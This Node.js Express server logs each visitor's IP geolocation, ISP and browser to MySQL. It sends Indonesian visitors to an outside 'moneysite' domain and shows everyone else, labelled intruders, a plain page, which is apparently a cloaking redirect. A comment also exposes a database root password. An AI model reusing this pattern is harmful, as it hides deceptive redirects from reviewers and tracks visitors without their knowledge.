const express = require("express");
const mysql = require("mysql");
const fetch = require("cross-fetch");

const app = express();
app.set('trust proxy', true);
app.use(express.static("public"));
app.use(express.json());

const con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "",
  database: "baltic_v1",
});
// const con = mysql.createConnection({
//   host: "localhost",
//   user: "root",
//   password: "Fr@nk1sHere",
//   database: "baltic_v1",
// });

con.connect(function (error) {
  if (error) {
    console.log("Database Connection FAILED");
    console.error(error);
    process.exit(1);
  } else {
    console.log("Database Connected Successfully");
  }
});

const redirectIfFromIndonesia = (request, response, next) => {
  const clientIP = request.headers["x-real-ip"] || request.headers["x-forwarded-for"] || request.connection.remoteAddress;
  const parts = clientIP.split(":");
  const ipv4 = parts[parts.length - 1];
  console.log("ip :", ipv4);

  console.log("fetch visitor");
  fetch(`https://ifconfig.co/json?ip=${ipv4}`)
    .then((res) => {
      if (res.status >= 400) {
        throw new Error("Bad response from server");
      }
      return res.json();
    })
    .then((user) => {
      console.log("fetch success");
      const referer = request.headers.referer || "";
      const ipaddress = user.ip;
      const country = user.country;
      const region = user.region_name;
      const city = user.city;
      const user_agent = request.headers["user-agent"];
      const isp = user.asn_org;
      const redirect = "https://basopetir.com";

      console.log("memasukkan visitor ke database");

      const sql = `INSERT INTO visitor (linkid, ipaddress, country, region, city, referer, browser, isp) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;

      con.query(
        sql,
        [0, ipaddress, country, region, city, referer, user_agent, isp],
        function (error, result) {
          console.log("data visitor telah dimasukkan");
          if (error) {
            console.error(error);
            response.status(500).json({
              status: "notok_2",
              message: "OOPS! Something Went Wrong",
            });
          } else {
            if (country === "Indonesia") {
              console.log("redirect moneysite");
              response.redirect(301, redirect);
            } else {
              console.log("penyusup");
              next();
            }
          }
        }
      );
    })
    .catch((err) => {
      console.error(err);
      response.status(500).json({
        status: "notok_3",
        message: "OOPS! Something Went Wrong",
      });
    });
};

app.use(redirectIfFromIndonesia);

app.get("/", function (request, response) {
  response.sendFile(__dirname + "/public/index.html");
});
app.get("/favicon.ico", function (request, response) {
  response.sendFile(__dirname + "/public/index.html");
});

app.all("*", (req, res) => {
  res.status(404).send("<h1>404! Page not found</h1>");
});

const PORT = 8088;
app.listen(PORT, () => {
  console.log(`SERVER RUNNING ON PORT : ${PORT}`);
});
